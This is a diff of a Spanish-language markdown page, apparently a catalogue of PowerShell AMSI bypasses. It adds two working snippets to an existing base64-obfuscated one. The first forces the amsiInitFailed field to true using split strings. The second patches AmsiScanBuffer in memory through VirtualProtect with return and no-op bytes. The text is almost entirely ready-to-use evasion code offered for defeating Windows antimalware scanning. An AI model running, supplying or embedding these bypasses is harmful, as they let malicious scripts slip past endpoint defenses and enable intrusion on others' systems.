@@ -29,3 +29,42 @@ Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomien
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
+[Error Frozado](#ferror)
+
+```powershell
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' 
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)   
+```
+
+[Memory Patching](#rastamouse)
+
+```powershell
+$Win32 = @"
+ 
+using System;
+using System.Runtime.InteropServices;
+ 
+public class Win32 {
+ 
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ 
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+ 
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+ 
+}
+"@
+ 
+Add-Type $Win32
+ 
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]0)
+$Patch = [Byte[]] (0xc3, 0x90, 0x90)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)  
+```
